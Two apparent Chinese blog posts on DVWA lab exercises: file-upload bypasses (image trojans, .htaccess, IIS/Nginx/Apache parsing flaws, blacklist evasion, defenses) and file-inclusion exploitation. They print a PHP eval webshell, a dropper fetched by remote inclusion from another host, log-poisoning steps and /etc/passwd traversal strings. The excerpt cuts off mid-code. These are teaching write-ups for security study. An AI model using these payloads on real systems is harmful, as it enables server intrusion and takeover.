src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200336.png"></p><p>上传成功后由../../hackable/uploads/shell.png succesfully uploaded!以及url</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200341.png"></p><p>可知shell.png被保存在了<a href="http://127.0.0.1/DVWA/hackable/uploads/%E4%B8%8B">http://127.0.0.1/DVWA/hackable/uploads/下</a></p></li><li><p>然后在网站中找到文件包含漏洞，执行该文件，就会在存在文件包含漏洞的那个脚本的当前目录下生成shell.php</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200344.png"></p><p>执行成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200354.png"></p><p>此时根据url可知在<a href="http://192.168.43.61/DVWA/vulnerabilities/fi/%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%94%9F%E6%88%90%E4%BA%86shell.php%EF%BC%8C%E5%85%B6%E5%86%85%E5%AE%B9%E4%B8%BA">http://192.168.43.61/DVWA/vulnerabilities/fi/目录下生成了shell.php，其内容为</a><strong><?php @eval(\$_POST['shell']); ?></strong></p></li><li><p>然后通过蚁剑连接即可</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200407.png"></p></li></ul><p><strong>绕过方法二：上传图片木马+.htaccess攻击</strong></p><ul><li><p>上传图片木马和上述一样，不再赘述</p></li><li><p>.htaccess 是Apache 服务器的分布式配置文件，该配置文件会覆盖Apache 服务器的全局配置，作用域是当前目录及其子目录。如果一个Web 应用允许上传的.htaccess 文件，那就意味着攻击者可以更改Apache 的配置，这是十分危险的。</p><p>因为设置了白名单所以上传.htaccess是不现实的，所以如果我们能修改全局的.htaccess文件</p><p>在.htaccess文件中添加<strong>AddType application/x-httpd-php .png</strong></p><p>则我们就可以将图片木马当php解析</p></li></ul><p> <strong>绕过方法三：上传图片木马+IIS,Nginx解析漏洞（Apache解析漏洞不行）</strong></p><ul><li>上传图片木马和上述一样，不再赘述</li><li>利用web容器的解析漏洞可以使图片木马当作特定脚本来执行</li></ul><blockquote><p><strong>IIS 5.x/6.0解析漏洞</strong><br>在IIS5.X和IIS6.0版本中存在以下两个解析漏洞。</p><p><strong>（1）目录解析漏洞</strong></p><p>在网站中建立名字为*.asp、*.asa的文件夹，其目录内的任何扩展名文件都会被IIS当做ASP文件来解析并执行。</p><p>例如：创建一个目录test.asp，那么/test.asp/1.jpg将被当做ASP文件来执行。</p><p>/xx.asp/xx.jpg<br><strong>（2）文件解析漏洞</strong></p><p>网站上传图片的时候，如果将网页木马文件的名字改成”<em>.asp;1.jpg”，分号后面的不被解析，也就是说，”</em>.asp;1.jpg”会被服务器看成是*.asp，就可以绕过服务器禁止上传ASP文件的限制，这样的畸形文件也同样会被IIS当做ASP文件来解析并执行。</p><p>例如：上传一个图片文件名为”test.asp;1.jpg”的木马文件，该文件可以被当做ASP文件解析并执行。</p><p>在IIS6.0版本中，默认可执行文件除了test.asp以外，还包括test.asa、test.cer、test.cdx这三种，同样也存在解析漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.asp;1.jpg</span><br><span class="line">test.asa;1.jpg</span><br><span class="line">test.cer;1.jpg</span><br><span class="line">test.cdx;1.jpg</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</strong><br>IIS 7.0/IIS 7.5/ Nginx &lt;8.03在Fast-CGI运行模式下，在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。</p><p>在某些使用有漏洞的网站中，访问<a href="http://127.0.0.1/1.jpg/1.php%EF%BC%8C%E6%AD%A4%E6%97%B6%E7%9A%841.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9CPHP%E8%84%9A%E6%9C%AC%E6%9D%A5%E8%A7%A3%E6%9E%90,%E6%AD%A4%E6%97%B61.php%E6%98%AF%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E3%80%82">http://127.0.0.1/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时1.php是不存在的。</a></p><p>这就意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。</p><p><strong>1.jpg/1.php</strong></p></blockquote><blockquote><p><strong>Nginx &lt;8.03 空字节代码执行漏洞</strong><br>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p><p>当使用PHP-FastCGI执行PHP时，遇到url里面存在%00空字节时与FastCGI的处理不一致，导致可在非PHP文件中嵌入PHP代码，通过访问url+%00.PHP来执行其中的PHP代码。</p><p>例如：”<a href="http://127.0.0.1/1.jpg%00.php&quot;%E4%BC%9A%E6%8A%8A1.jpg%E6%96%87%E4%BB%B6%EF%BC%88%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%89%E5%BD%93%E5%81%9APHP%E6%96%87%E4%BB%B6%E6%9D%A5%E6%89%A7%E8%A1%8C%E3%80%82">http://127.0.0.1/1.jpg%00.php&quot;会把1.jpg文件（木马文件）当做PHP文件来执行。</a></p><p><strong>xxx.jpg%00.php</strong></p></blockquote></li><li><p><strong>对于黑名单常用的绕过方法有：</strong></p><ul><li>大小写绕过</li><li>双写绕过</li><li>空格绕过</li><li>上传图片木马+IIS，Nginx，Apache解析漏洞</li><li>上传图片木马+文件包含</li><li>上传图片木马+.htaccess攻击</li></ul><p><strong>绕过方法一：大小写绕过</strong></p><p>在对后缀的判断中，没有用到<strong>strtolower($file_ext</strong>)函数而只是对字符串进行单独的比对来判断是不是限制文件，可以采用后缀名大小写绕过形式。</p><p><strong>shell.Php</strong></p><p><strong>绕过方法二：大小写绕过</strong></p><p>如果后端只是对违规后缀名替换为空的话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace( <span class="keyword">array</span>( <span class="string">&quot;php&quot;</span>,<span class="string">&quot;asp&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$uploaded_ext</span> )</span><br></pre></td></tr></table></figure><p>也可以用双写绕过，比如shell.phphpp</p><p><strong>绕过方法二：空格绕过</strong></p><p>如果黑名单没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p><strong>绕过方法三：上传图片木马+IIS，Nginx，Apache解析漏洞</strong></p><p>IIS和Nginx解析漏洞已经说过了，这里主要说一下Apache解析漏洞</p><blockquote><p><strong>Apache解析漏洞</strong></p><p>在Apache 1.x和Apache 2.x中也存在解析漏洞。</p><p>例如：1.php.rar会被当作php文件执行。</p><p>Apache在解析文件时有一个原则：按照识别“.”后的扩展名来解析，当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止。</p><p>例如：1.php.aa.bb.cc</p><p>1.php.aa.bb.cc<br>会先解析cc，若cc不存在则解析bb，bb不存在则解析aa，aa不存在则只能解析PHP了。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。</p><p>这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为PHP、ASP、ASA等的文件）</p></blockquote></li></ol><h3 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h3><p>getimagesize()函数会对文件的头部内容进行检测，可以通过添加文件幻术的方法或者制作图片木马的方法来进行绕过，上传成功后结合解析漏洞或者.htaccess或者文件包含漏洞来等getshell</p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>在DVWA中的文件上传板块来看，low级别没有对上传文件做任何限制随意上传webshell，medium级别对上传的文件MIME类型以及文件长度进行了限制，high级别启用了白名单策略并利用getimagesize()检查文件内容看是否是图片来进行验证，总的来说都是可以绕过的。而对于impossible级别来说，先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line"><span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line"><span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line"><span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line"><span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br><span class="line">imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line"><span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete any temp files</span></span><br><span class="line"><span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br></pre></td></tr></table></figure><p>将文件名添加了一串id并进行了md5处理，然后连接上文件后缀</p><p>比如shell.php在服务器里就可能是21989392183.php</p><p>这样做就让攻击者无法知道自己所保存在服务器的文件的文件名是什么，从而无法找到上传的文件</p><p>剩下也进行了一些常规的文件名，文件后缀以及内容检测。最重要的还是服务器将上传的文件的文件名进行了重命名</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul><li>文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。（有用）</li><li>判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li><li>判断文件内容。图片文件的头部内容格式都是一样的，可以检查文件头部内容是否满足文件幻术</li><li>使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。（有用）</li><li>单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li><li>使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文首先对于文件上传漏洞的基本原理，上传条件及危害进行了阐述，并详细介绍了各种绕过方法，然后介绍了DVWA的文件上传板块，最后阐述了文件上传漏洞的防御方法。总的来说文件上传绕过可利用制作图片木马的方式，然后通过文件包含，解析漏洞，.hetaccess来执行图片木马从而来getshell。</p><blockquote><p><a href="https://gcdcx.blog.csdn.net/article/details/105962968">https://gcdcx.blog.csdn.net/article/details/105962968</a></p><p><a href="https://blog.csdn.net/qq_38684504/article/details/91351851">https://blog.csdn.net/qq_38684504/article/details/91351851</a></p><p><a href="https://blog.csdn.net/m0_38103658/article/details/100162185">https://blog.csdn.net/m0_38103658/article/details/100162185</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之文件包含漏洞复现</title>
      <link href="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p>随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞。</p><h2 id="漏洞产生原因："><a href="#漏洞产生原因：" class="headerlink" title="漏洞产生原因："></a>漏洞产生原因：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$path</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1、Web 应用实现了动态包含</p><p>2、动态包含的文件路径参数，客户端可控</p><h2 id="php文件包含关键字"><a href="#php文件包含关键字" class="headerlink" title="php文件包含关键字"></a>php文件包含关键字</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">include</span>()<span class="comment">//文件包含失败，会产生警告，脚本会继续执行</span></span><br><span class="line"><span class="number">2</span>.<span class="keyword">include_once</span>()<span class="comment">//与include() 功能相同，文件只会被包含一次</span></span><br><span class="line"><span class="number">3</span>.<span class="keyword">require</span>()<span class="comment">//文件包含失败是，会产生错误，直接结束脚本执行</span></span><br><span class="line"><span class="number">4</span>.<span class="keyword">require_once</span>()<span class="comment">//与require() 功能相同 ，文件只会被包含一次</span></span><br></pre></td></tr></table></figure><p>注：在进行文件包含测试时须将php.ini中的</p><p>​        allow_url_fopen=On</p><p>​        本地文件包含（LFI）</p><p>​        allow_url_include=On</p><p>​        远程文件包含（RFI）</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li><p>本地文件包含</p><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p><p>eg：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=./shell.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=./shell.php</a></p></li><li><p>远程文件包含</p><p>远程文件包含就是我们可以通过http(s)或者ftp 等方式，远程加载文件使其被包含</p><p>eg：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://192.168.1.200/include/info.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://192.168.1.200/include/info.php</a></p></li></ul><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>?page=a.php</p><p>?home=b.html</p><p>?file=content</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>?file=../../../../etc/passwd<br>?page=file:///etc/passwd<br>?home=main.cgi<br>?page=<a href="http://www.a.com/1.php">http://www.a.com/1.php</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>注意包含文件时如果文件中没有php代码就返回整个文本，如果有php代码则无条件执行</p><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>可以利用文件包含漏洞读取网站任意文件</p><p>例如读取hosts文件</p><p>[?path=c:\windows\System32\drivers\etc\hosts]</p><p>[?path=............\windows\System32\drivers\etc\hosts]</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>通过文件包含可以实现向网站上传一句话木马，上传方式有三种</p><ul><li><p><strong>思路：</strong><br>先在b服务器放置getwebshell.txt<br>然后在a服务器找到文件包含漏洞<br>接着通过a服务器去包含b的getwebshell.txt</p><p>eg: <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://192.168.1.200/getwebshell.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://192.168.1.200/getwebshell.txt</a></p><p>然后用菜刀连接</p><p>其中getwebshell.txt内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当a服务器include该文件后会在服务器当前目录下生成一个webshell，然后用蚁剑连接即可</p></li><li><p>思路：</p><p>现在a网站找到文件上传漏洞，然后上传getwebshell.txt，然后利用本地文件包含来生成一个webshell，然后用蚁剑连接即可</p></li><li><p>思路：</p><p>可以利用包含本地日志文件的方式，因为我们知道一个网站的日志文件一定是有写权限的，我们可以设法将getwebshell.txt内容写到日志文件中去，然后包含日志文件就会在服务器当前目录下生成一个webshell，然后用蚁剑连接即可</p><p>例如浏览器输入<img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721202438.png"></p><p>显然当后端include $page的时候就会发生错误因为这不是一个有效路径</p><p>所以就会在日志中记录下来，打开D:\phpStudy\PHPTutorial\Apache\logs\error.log发现里面多了一条记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Tue Jul 20 16:36:30.656654 2021] [:error] [pid 8072:tid 2188] [client 127.0.0.1:54929] PHP Warning:  include(): Failed opening &#x27;&amp;lt;?php @eval($_POST[&#x27;shell&#x27;]); echo&amp;quot;luck&amp;quot;; ?&amp;gt;&#x27; for inclusion (include_path=&#x27;.;C:\\php\\pear;../../external/phpids/0.6/lib/&#x27;) in D:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\fi\\index.php on line 36</span><br></pre></td></tr></table></figure><p>这时候只要攻击者知道日志文件的路径然后利用文件包含漏洞就可以getshell</p></li></ul><h2 id="DVWA-文件包含漏洞"><a href="#DVWA-文件包含漏洞" class="headerlink" title="DVWA 文件包含漏洞"></a>DVWA 文件包含漏洞</h2><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203002.png"></p><p>点击file1.php发现url为：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php</a></p><p>且页面返回如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203011.png"></p><p>点击file2.php发现url为：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file2.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file2.php</a></p><p>且页面返回如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203017.png"></p><p>符合文件包含特征，初步判断后端可能存在文件包含，代码猜测如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$page</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试将参数改为<a href="http://127.0.0.1/index.php">http://127.0.0.1/index.php</a></p><p>即<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/index.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/index.php</a></p><p>页面回显</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203027.png"></p><p>表明存在文件包含漏洞，且没有经过任何前端过滤措施</p><p><strong>接下来尝试getshell</strong></p><p>假设攻击者服务器也是127.0.0.1且在根目录下存放getwebshell.txt</p><p>然后url中输入<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/DVWA/getwebshell.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/DVWA/getwebshell.txt</a></p><p>发现受害者服务器中出现了shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后利用蚁剑连接，添加数据如下</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203042.png"></p><p>连接成功，获取对方服务器各种信息</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203045.png"></p><p>以下所有级别getshell方法如上相同，所以不再赘述只讲如何触发文件包含漏洞</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>继续输入<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/index.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/index.php</a></p><p>发现页面回显</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203111.png"></p><p>说明后端过滤掉了http://，所以尝试<strong>双写绕过</strong></p><p>输入<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/index.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/index.php</a></p><p>返回index.php成功，触发成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203027.png"></p><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 